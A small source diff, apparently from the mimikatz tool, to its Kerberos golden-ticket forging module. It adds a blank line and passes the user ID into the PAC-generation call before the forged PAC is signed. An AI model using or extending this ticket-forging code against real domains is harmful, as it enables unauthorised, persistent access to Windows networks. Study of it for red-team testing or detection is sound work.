@@ -421,6 +421,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 	NTSTATUS status;
 	PKERB_ECRYPT pCSystem;
 	BOOL isPtt = kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL);
+	
 
 	kull_m_string_args_byName(argc, argv, L"ticket", &filename, L"ticket." MIMIKATZ_KERBEROS_EXT);
 	if(kull_m_string_args_byName(argc, argv, L"admin", &szUser, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
@@ -634,7 +635,7 @@ PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWST
 	{
 		if(pValidationInfo = kuhl_m_pac_infoToValidationInfo(&lifetime->TicketStart, username, domainname, LogonDomainName, sid, userid, groups, cbGroups, sids, cbSids))
 		{
-			if(kuhl_m_pac_validationInfo_to_PAC(pValidationInfo, NULL, NULL, SignatureType, pClaimsSet,sid, &pacType, &pacTypeSize))
+			if(kuhl_m_pac_validationInfo_to_PAC(pValidationInfo, NULL, NULL, SignatureType, pClaimsSet,sid, userid, &pacType, &pacTypeSize))
 			{
 				kprintf(L" * PAC generated\n");
 				status = kuhl_m_pac_signature(pacType, pacTypeSize, SignatureType, key, keySize);
